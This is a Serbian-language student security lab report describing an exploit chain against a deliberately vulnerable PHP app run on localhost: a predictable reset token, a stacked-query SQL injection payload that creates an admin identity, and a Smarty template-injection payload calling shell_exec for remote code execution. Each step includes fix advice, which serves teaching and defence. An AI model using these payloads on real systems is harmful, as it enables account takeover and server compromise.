**LOGIN BYPASS - Viktor Srbljin SV63/2022**



**Metod pregleda koda**



- Za statičku analizu nisam koristio alat, već ručno čitanje izvornog koda u VS Code-u.

- Na Linux-u sam mogao da koristim `grep` (npr. `grep -rn "generateToken" app/`), ali sam umesto toga otvorio fajlove jedan po jedan i pratio tok podataka od forme do baze.

- **Zašto:** PDF zadatak traži code review pristup; ručno čitanje omogućava da se vidi ceo flow, a ne samo pojedinačni match.



**Mapiranje auth površine**



- Na login stranici postoje linkovi: `login.php`, `forgotusername.php`, `forgotpassword.php`.

- Testirao sam **Forgot password** za `user1` - aplikacija prikazuje poruku "Email sent!", ali token se nigde ne prikazuje u browseru.

- **Zašto:** ako token ne stiže korisniku kroz UI, mora postojati drugi način da se dođe do njega (čitanje iz baze, SQLi, ili predviđanje generisanja).



**Flow zahteva za promenu šifre - od forme do baze**



1. **`forgotpassword.php` (POST)** - korisnik unosi `username`.

   - Provera da korisnik postoji u tabeli `users` (prepared statement).

   - Admin (`admin`) je eksplicitno blokiran.

   - Poziva se `generateToken()` iz `app/includes/utils.php`.

   - Token se upisuje u tabelu `tokens` (`uid`, `token`).

   - Korisnik vidi samo "Email sent!" - email se u Docker okruženju ne šalje.

2. **`resetpassword.php?token=...` (GET)** - provera da li token postoji u bazi.

   - Ako postoji -> prikaz forme za novu lozinku.

   - Ako ne -> poruka "Token is invalid."

3. **`resetpassword.php` (POST)** - korisnik šalje `token`, `password1`, `password2`.

   - Provera tokena u tabeli `tokens`.

   - `UPDATE users SET password = ... WHERE uid = ...` (SHA256 hash).

   - `DELETE FROM tokens WHERE token = ...` (token je jednokratan).

4. **`login.php` (POST)** - login sa novom lozinkom.



**Kako sam shvatio da se token čuva u bazi**



- U `docker/init.sql` postoji tabela `tokens` sa kolonama `uid` i `token`.

- U `forgotpassword.php` (linija 22-23) vidi se `INSERT INTO tokens`.

- Ručna provera u bazi potvrđuje:



```bash
docker exec -it tudo-db psql -U postgres tudo -c "SELECT * FROM tokens;"
```



- Posle *Forgot password* requesta u tabeli se pojavi novi red; posle uspešnog reset-a token nestane.

- **Zašto:** token je jedini ključ za promenu tuđe lozinke - ko ga ima, menja lozinku.



**Ranjivost - predvidiv token**



- Funkcija `generateToken()` u `app/includes/utils.php`:



```php
srand(round(microtime(true) * 1000));
// zatim 32x rand() → string od 32 karaktera
```



- Seed za `rand()` je trenutno vreme u milisekundama - nije kriptografski siguran generator.

- Ako znamo približno vreme kad je server generisao token, možemo lokalno generisati iste kandidate.

- **Zašto:** `srand()` + `rand()` nisu namenjeni za security tokene; seed je trivijalan za pogoditi u uskom vremenskom prozoru.



**Exploit skripta**



- Lokacija: `tudo/scripts/exploit_chain.py` (Step 1), logika u `tudo/scripts/auth.py`.

- Pokretanje:



```bash
cd tudo
python3 scripts/exploit_chain.py http://localhost:8000 user1 'nova_sifra'
```



- Koraci koje skripta radi:

  1. `POST /forgotpassword.php` - zabeleži vreme pre i posle requesta.

  2. `generateTokens.php` - generiše listu mogućih tokena za taj vremenski opseg (isti PHP algoritam kao aplikacija).

  3. `GET /resetpassword.php?token=...` - traži validan token.

  4. `POST /resetpassword.php` - postavlja novu lozinku.

  5. `POST /login.php` - potvrđuje da login radi.



**Rezime BYPASS provere**



- Tip ranjivosti: predvidiv password reset token (slaba randomizacija).

- Impact: napadač bez lozinke može resetovati nalog bilo kog korisnika osim `admin`.

- PoC: `exploit_chain.py` Step 1.



**Kako sprečiti ovu ranjivost**



- Koristiti kriptografski siguran generator, npr. PHP `random_bytes()` / `bin2hex(random_bytes(32))` ili `random_int()`.

- **Ne koristiti** `srand()` i `rand()` za security tokene.

- Token slati korisniku samo preko emaila (ili drugog kanala van aplikacije), sa rokom važenja.

- Ograničiti broj pokušaja reset-a po IP/korisniku (rate limiting).

- **Zašto:** `random_bytes()` daje entropiju koju napadač ne može predvideti iz vremena requesta.

** **

**ADMIN PRIVELEGE ESCALATION - Uros Djosic SV20/2022**



**Metod pregleda koda**



- Statička analiza ručnim čitanjem u VS Code-u, praćenjem toka podataka od HTTP parametra do SQL upita i zatim do login/session logike.
- Koristio sam `grep -rn "pg_query\\|isadmin\\|username" app/` da nađem neparametrizovane SQL upite i način na koji aplikacija odlučuje ko je admin.
- **Zašto:** u ovoj verziji aplikacije nema `is_admin` kolone; admin privilegija zavisi od toga da li je korisnik u sesiji ulogovan sa username vrednošću `admin`.



**Mapiranje admin površine**



- Admin funkcije su dostupne preko `admin/update_motd.php`.
- `update_motd.php` proverava samo `$_SESSION['isadmin']`.
- U `login.php` se `$_SESSION['isadmin'] = true` postavlja kada je `$_SESSION['username'] === 'admin'`.
- Tabela `users` u `docker/init.sql` nema unique constraint nad kolonom `username`.
- **Zašto:** ako možemo promeniti username regularnog korisnika u `admin`, zatim se ulogovati tom lozinkom, aplikacija će sesiju tretirati kao admin.



**Pronalaženje ranjivog mesta - forgotusername.php**



- U `app/forgotusername.php` nalazi se sledeći kod:

```php
$username = $_POST['username'];
$ret = pg_query($db, "select * from users where username='".$username."';");
```

- Parametar `username` se direktno spaja u SQL string.
- Koristi se `pg_query()`, pa PostgreSQL prihvata stacked queries.
- **Zašto:** kontrolišemo sadržaj između navodnika; možemo zatvoriti string, dodati `UPDATE`, i ostatak originalnog upita pretvoriti u komentar.



**Exploit payload - promena username-a**



- Payload za eskalaciju privilegija:

```sql
'; UPDATE users SET username='admin' WHERE username='user1' --
```

- Dekompozicija:
  - `'` - zatvara originalni string literal.
  - `;` - pokreće novu SQL naredbu.
  - `UPDATE users SET username='admin' WHERE username='user1'` - menja username našeg naloga.
  - ` --` - komentariše ostatak originalnog upita.
- Posle Step 1 već znamo novu lozinku za `user1`.
- Nakon UPDATE-a radimo login kao `admin` sa tom novom lozinkom.
- **Zašto:** login upit proverava username i hash lozinke; izmenjeni `user1` red sada ima username `admin` i lozinku koju kontrolišemo.



**Verifikacija - admin panel**



- Posle SQLi payload-a skripta radi logout iz stare `user1` sesije.
- Zatim šalje `POST /login.php` sa:

```text
username=admin
password=nova_sifra
```

- Ako login uspe, `login.php` postavlja `$_SESSION['isadmin'] = true`.
- `GET /admin/update_motd.php` zatim vraća HTTP 200 i prikazuje formu "Update MoTD".
- **Zašto:** to potvrđuje da imamo stvarnu admin sesiju, a ne samo izmenjen podatak u bazi.



**Exploit skripta**



- Lokacija: `rbs-main/v5/privesc.py` (helper), `rbs-main/v5/exploit_chain.py` (Step 2).
- Pokretanje kompletnog chain-a:

```bash
cd rbs-main/v5
python3 exploit_chain.py http://localhost:8000 user1 'nova_sifra'
```

- Koraci koje skripta radi (Step 2):
  1. Proverava da li je trenutna sesija već admin preko `GET /admin/update_motd.php`.
  2. Radi logout iz regularne sesije.
  3. Šalje SQLi payload na `POST /forgotusername.php`.
  4. Loguje se kao `admin` sa lozinkom postavljenom u Step 1.
  5. Ponovo proverava `admin/update_motd.php`.



**Rezime privesc provere**



- Tip ranjivosti: SQL Injection (stacked queries) + slaba admin autorizacija.
- Mesto: `app/forgotusername.php`, parametar `$_POST['username']`, funkcija `pg_query()`.
- Dodatni uzrok: `login.php` admin status vezuje za username string `admin`, a ne za robustan serverski permission model.
- Impact: napadač koji je preuzeo regularan nalog može napraviti admin sesiju bez znanja originalne admin lozinke.
- PoC: `privesc.py` pozvan iz `exploit_chain.py` Step 2.



**Kako sprečiti ovu ranjivost**



- Koristiti parameterizovane upite:

```php
$ret = pg_prepare($db, "forgotusername_query", "select * from users where username = $1");
$ret = pg_execute($db, "forgotusername_query", array($username));
```

- Dodati `UNIQUE` constraint na `users.username`.
- Admin privilegije čuvati kao poseban server-side permission atribut, ne zaključivati ih samo iz username stringa.
- Posle promene privilegija ili identiteta invalidirati postojeće sesije.
- **Zašto:** parametrizacija uklanja SQLi, a stabilan permission model sprečava da obična promena username-a postane eskalacija privilegija.


**REMOTE CODE EXECUTION - Aleksa Siljic SV50/2022**



**Metod pregleda koda**



- RCE sam tražio ručnom statičkom analizom, fokusirano na admin funkcionalnosti koje obrađuju fajlove, template-e i korisnički kontrolisan sadržaj.
- Koristio sam pretragu po opasnim funkcijama i površinama:

```bash
grep -rn "fopen\|fwrite\|fetch\|Smarty\|unserialize\|move_uploaded_file\|shell_exec\|system" app/
```

- **Zašto:** RCE često nastaje tamo gde aplikacija korisnički unos upisuje u fajl koji se kasnije izvršava, parsira kao template, učitava kao kod ili prosleđuje sistemskoj komandi.



**Mapiranje RCE površine**



- Posle admin privilege escalation koraka dobijamo pristup admin funkcijama.
- Na glavnoj stranici (`index.php`) admin vidi link ka `admin/update_motd.php`.
- `admin/update_motd.php` omogućava adminu da promeni Message of the Day.
- `index.php` zatim učitava isti MoTD fajl preko Smarty template engine-a.
- **Zašto:** ako možemo da upišemo Smarty sintaksu u template fajl, a aplikacija taj fajl izvršava kao template, korisnički unos postaje server-side template code.



**Pronalaženje ranjivog mesta - update_motd.php**



- U `app/admin/update_motd.php` nalazi se sledeći kod:

```php
$message = $_POST['message'];

if ($message !== "") {
    $t_file = fopen("../templates/motd.tpl","w");
    fwrite($t_file, $message);
    fclose($t_file);
}
```

- Parametar `message` se bez filtriranja upisuje direktno u `app/templates/motd.tpl`.
- Nema whitelist-e dozvoljenih tagova, nema escape-a Smarty delimiter-a (`{` i `}`), nema sandbox/security moda.
- **Zašto:** `motd.tpl` nije običan tekstualni fajl; kasnije ga parsira Smarty, pa sadržaj fajla ima semantiku koda.



**Kako se template izvršava - index.php**



- U `app/index.php` nalazi se:

```php
require 'vendor/autoload.php';
$smarty = new Smarty();
$smarty->assign("username", $_SESSION['username']);
$smarty->force_compile = true;
echo $smarty->fetch("motd.tpl").'<br>';
```

- Smarty 2.6.31 je instaliran kroz Composer.
- Security mode nije uključen (`$smarty->security` ostaje default `false`).
- `force_compile = true` dodatno olakšava eksploataciju jer se template rekompajlira pri učitavanju.
- **Zašto:** napadač prvo upisuje payload u template, a zatim običnim `GET /index.php` tera aplikaciju da taj payload kompajlira i izvrši.



**Ranjivost - Server-Side Template Injection**



- Smarty dozvoljava upotrebu PHP funkcija kao template modifikatora kada security mode nije uključen.
- Payload za izvršavanje komande:

```smarty
{"id 2>&1"|shell_exec}
```

- Dekompozicija:
  - `"id 2>&1"` - string koji predstavlja shell komandu.
  - `|shell_exec` - Smarty modifikator koji poziva PHP funkciju `shell_exec`.
  - rezultat se ispisuje u HTML odgovoru jer se template renderuje na `/index.php`.
- **Zašto:** aplikacija tretira admin unos kao trusted template kod, ali nakon Step 2 napadač postaje admin i može kontrolisati taj unos.



**Kako sam potvrdio ranjivost**



1. Nakon Step 1 i Step 2, pristupio sam `GET /admin/update_motd.php`.
2. Poslao sam `POST /admin/update_motd.php` sa `message` vrednošću:

```smarty
RCE_START
{"id 2>&1"|shell_exec}
RCE_END
```

3. Otvorio sam `GET /index.php`.
4. U odgovoru se između markera pojavljuje output komande `id`.
5. Time je potvrđeno da se komanda izvršava na serveru, u kontekstu web procesa.



**Exploit skripta**



- Lokacija: `rbs-main/v5/rce.py` (helper), `rbs-main/v5/exploit_chain.py` (Step 3).
- Pokretanje kompletnog chain-a:

```bash
cd rbs-main/v5
python3 exploit_chain.py http://localhost:8000 user1 'nova_sifra'
```

- Pokretanje sa drugom komandom:

```bash
python3 exploit_chain.py http://localhost:8000 user1 'nova_sifra' -c 'whoami'
```

- Koraci koje skripta radi (Step 3):
  1. Proverava da li je `admin/update_motd.php` dostupan trenutnoj sesiji.
  2. Upisuje Smarty payload u `templates/motd.tpl`.
  3. Poziva `GET /index.php` kako bi se template izvršio.
  4. Traži output komande između `RCE_START_...` i `RCE_END_...` markera.
  5. Ispisuje output u terminal.



**Rezime RCE provere**



- Tip ranjivosti: Server-Side Template Injection (SSTI) koja vodi do RCE.
- Mesto: `app/admin/update_motd.php`, parametar `message`; izvršavanje u `app/index.php` preko `Smarty::fetch("motd.tpl")`.
- Preduslov: admin sesija, koju exploit chain dobija u Step 2.
- Impact: napadač može izvršavati proizvoljne sistemske komande na serveru.
- PoC: `rce.py` pozvan iz `exploit_chain.py` Step 3.



**Kako sprečiti ovu ranjivost**



- Ne dozvoliti da korisnički unos direktno postane template fajl.
- MoTD poruku čuvati kao običan tekst u bazi i prikazivati je sa HTML escape-om, npr. `htmlentities`.
- Ako admin mora da koristi formatiranje, dozvoliti samo mali whitelist bezbednih tagova, npr. Markdown bez HTML-a.
- Uključiti Smarty security mode i zabraniti PHP funkcije/modifikatore koji mogu izvršavati komande.
- Template fajlove tretirati kao deo aplikacionog koda, ne kao dinamički korisnički sadržaj.
- **Zašto:** razdvajanjem podataka od template koda sprečava se da unos iz forme dobije mogućnost izvršavanja na serveru.
